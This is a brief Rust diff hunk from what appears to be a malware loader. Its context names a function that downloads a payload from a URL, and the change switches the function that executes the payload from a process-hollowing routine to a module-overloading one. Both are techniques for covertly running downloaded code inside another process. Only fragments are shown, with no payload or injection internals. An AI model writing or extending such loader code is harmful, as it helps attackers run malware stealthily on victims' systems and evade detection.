@@ -42,5 +42,5 @@ async fn download_payload(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Erro
 }
 
 fn execute_payload(bytes: &[u8], target: &str) -> Result<(), Box<dyn std::error::Error>> {
-    hollowing::run_pe(bytes, target)
+    hollowing::run_overloaded(bytes, target)
 }
